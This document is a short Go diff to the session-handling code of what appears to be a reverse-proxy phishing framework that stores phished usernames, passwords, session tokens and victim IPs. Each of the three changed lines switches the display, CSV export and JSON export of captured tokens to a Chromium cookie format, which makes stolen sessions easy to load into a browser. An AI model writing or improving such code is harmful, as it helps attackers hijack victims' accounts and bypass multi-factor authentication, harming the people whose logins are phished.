@@ -392,7 +392,7 @@ func (t *Terminal) handleSessions(args []string) error {
 				}
 
 				if len(s.Tokens) > 0 {
-					json_tokens := tokensToJSON(s.Tokens)
+					json_tokens := tokensToCookie(s.Tokens, "Chromium")
 					t.output("%s\n", json_tokens)
 				} else {
 					t.output("\n")
@@ -488,7 +488,7 @@ func (t *Terminal) handleSessions(args []string) error {
 				wr := csv.NewWriter(outFile)
 				wr.Write([]string{"Id", "Phishlet", "Username", "Password", "Tokens (base64 encoded)", "Remote IP", "Time"})
 				for _, s := range sessions {
-					base64tokens := base64.StdEncoding.EncodeToString([]byte(tokensToJSON(s.Tokens)))
+					base64tokens := base64.StdEncoding.EncodeToString([]byte(tokensToCookie(s.Tokens, "Chromium")))
 					wr.Write([]string{strconv.Itoa(s.Id), s.Phishlet, s.Username, s.Password, base64tokens, s.RemoteAddr, time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")})
 				}
 				wr.Flush()
@@ -510,7 +510,7 @@ func (t *Terminal) handleSessions(args []string) error {
 						Phishlet:   s.Phishlet,
 						Username:   s.Username,
 						Password:   s.Password,
-						Tokens:     base64.StdEncoding.EncodeToString([]byte(tokensToJSON(s.Tokens))),
+						Tokens:     base64.StdEncoding.EncodeToString([]byte(tokensToCookie(s.Tokens, "Chromium"))),
 						RemoteAddr: s.RemoteAddr,
 						Time:       time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"),
 					}
